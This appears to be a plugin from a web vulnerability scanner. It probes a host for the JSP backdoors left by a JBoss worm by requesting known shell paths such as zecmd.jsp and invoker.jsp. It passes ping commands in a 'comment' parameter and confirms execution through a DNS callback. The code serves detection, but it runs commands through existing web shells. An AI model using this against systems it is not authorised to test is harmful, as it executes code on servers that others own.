#!/usr/bin/python
# -*- coding: utf-8 -*-
from engine.engine_utils.common import *
from engine.logger import scanLogger as logger
from exec_cmd_dns_log import _cmd_poc, callback

inj_value_list = [
    "/zecmd.jsp",
    "/idssvc.jsp",
    "/iesvc.jsp",
    "/wstats.jsp",
    "/invoker.jsp",
    "/zecmd/zecmd.jsp",
    "/idssvc/idssvc.jsp",
    "/iesvc/iesvc.jsp",
    "/wstats/wstats.jsp"
]


def run_domain(http,ob):
    try:
        scheme = ob['scheme']
        domain = ob['domain']
        header = {'Host': domain}
        source_ip = ob.get('source_ip')
        if source_ip:
            domain = source_ip
        result_list = []
        random_str, ping_cmd_list = _cmd_poc()
        i = 0
        for cmd in ping_cmd_list:
            for inj_value in inj_value_list:
                new_url = "%s://%s%s?%s%s" % (scheme, domain, inj_value, "comment=", cmd)
                res, content = http.request(new_url, "GET", headers=header)
                if callback(random_str):
                    request = getRequest(new_url, domain=ob['domain'])
                    response = getResponse(res,content)
                    detail = "检测到JBoss蠕虫后门"
                    result_list.append(getRecord(ob, new_url, ob['level'], detail, request=request, response=response, output=""))
                    i += 1
                    break
            if i != 0:
                break
        return result_list
    except Exception,e:
        logger.error("File:JBossCheckJspScript_yd.py, run_domain function :%s" % (str(e)))
        return []